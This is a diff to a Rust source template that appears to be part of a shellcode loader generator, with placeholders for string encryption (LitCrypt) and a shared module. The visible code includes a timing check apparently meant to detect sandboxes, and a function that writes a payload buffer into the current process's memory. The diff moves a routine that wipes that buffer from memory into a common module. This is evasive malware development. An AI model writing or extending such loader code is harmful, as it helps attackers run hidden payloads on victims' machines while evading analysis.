@@ -2,6 +2,7 @@
 #![allow(non_snake_case)]
 
 {{LITCRYPT_SETUP}}
+{{COMMON_MODULE}}
 
 use std::ffi::CString;
 use std::include_bytes;
@@ -68,12 +69,6 @@ fn check_environment() -> bool {
     start.elapsed().as_millis() >= 2500
 }
 
-fn wipe(buf: &mut Vec<u8>) {
-    for b in buf.iter_mut() {
-        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
-    }
-    buf.clear();
-}
 
 fn enhance(mut buf: Vec<u8>) {
     let current_process: HANDLE = -1isize as HANDLE;
@@ -95,7 +90,7 @@ fn enhance(mut buf: Vec<u8>) {
         let s = f_write(current_process, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
         if !NT_SUCCESS(s) { return; }
 
-        wipe(&mut buf);
+        common::wipe(&mut buf);
         pause(200);
 
         let mut old_protect: u32 = 0;
